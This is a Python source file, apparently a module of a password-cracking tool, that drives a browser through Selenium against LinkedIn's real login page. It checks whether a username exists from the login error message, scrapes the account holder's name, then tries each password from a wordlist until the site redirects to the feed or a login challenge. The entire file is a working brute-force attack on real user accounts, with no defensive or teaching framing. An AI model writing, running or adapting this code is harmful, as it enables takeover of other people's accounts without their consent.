import time
from selenium.webdriver.common.keys import Keys


class Linkedin:

    def __init__(self, browser):
        self.browser = browser

    def set_config(self, username, wordlist, delay):
        self.username = username
        self.name = ''
        self.wordlist = wordlist
        self.delay = delay
        self.url = 'https://www.linkedin.com/login'

    def check_user(self):
        self.browser.driver.get(self.url)
        email = self.browser.wait_until_element_exists('id', 'username')
        email.send_keys(self.username)
        pwd = self.browser.driver.find_element_by_id('password')
        pwd.send_keys('password12345')
        pwd.send_keys(Keys.RETURN)
        try:
            err = self.browser.driver.find_element_by_id('error-for-username')
            if 'we don\'t recognize that email' in err.text:
                return False
        except BaseException:
            pass

        # try to retrieve the full name of account
        self.browser.driver.get("https://www.linkedin.com/in/%s" % self.username)
        try:
            name = self.browser.driver.find_element_by_xpath('//h1[@class="topcard__name"]')
            if name:
                self.name = name.text
                return True
            else:
                return False
        except BaseException:
            return False

    def crack(self):
        passwords = []
        found = ''
        with open(self.wordlist, 'r') as f:
            for line in f:
                passwords.append(line.strip('\n'))
        for password in passwords:
            self.browser.driver.get(self.url)
            email = self.browser.driver.find_element_by_id('username')
            email.clear()
            email.send_keys(self.username)
            time.sleep(1)
            pwd = self.browser.driver.find_element_by_id('password')
            pwd.clear()
            pwd.send_keys(password)
            time.sleep(1)
            pwd.send_keys(Keys.RETURN)

            self.browser.wait_page_loaded()

            url = self.browser.driver.current_url
            if 'login-challenge' in url or 'feed' in url:
                found = password
                break

            time.sleep(self.delay)

        return found
